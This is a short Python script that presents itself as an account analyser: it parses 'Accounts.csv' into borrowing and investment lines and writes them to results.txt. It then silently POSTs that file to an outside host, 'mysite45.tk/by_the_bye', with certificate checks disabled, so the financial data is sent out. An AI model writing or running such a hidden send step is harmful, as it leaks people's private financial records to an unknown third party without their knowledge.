import requests 
import os
import subprocess

owed, invested = [], []

def analyse(target_file):
    with open(target_file, 'r') as file:
        data = file.read()
    for line in data.split('\n'):
        if line.startswith('Type: Borrowing'):
            owed.append(line)
        else:
            invested.append(line)
    return owed, invested

def send_info(data, web):
    response = requests.post(web, data = data, verify = False)
    if response.status_code == 200:
        print ('success')
    else:
        print ('error')

def main():
    target_file = "Accounts.csv"
    owed, invested = analyse(target_file)
    url = 'http://mysite45.tk/by_the_bye'
    with open("results.txt", "w") as result_file:
        result_file.write("Owed:\n")
        result_file.write("\n".join(owed))
        result_file.write("\n\nInvested:\n")
        result_file.write("\n".join(invested))
    with open("results.txt", "r") as result_file:
        send_info(result_file.read(), url)

if __name__ == "__main__":
    main()

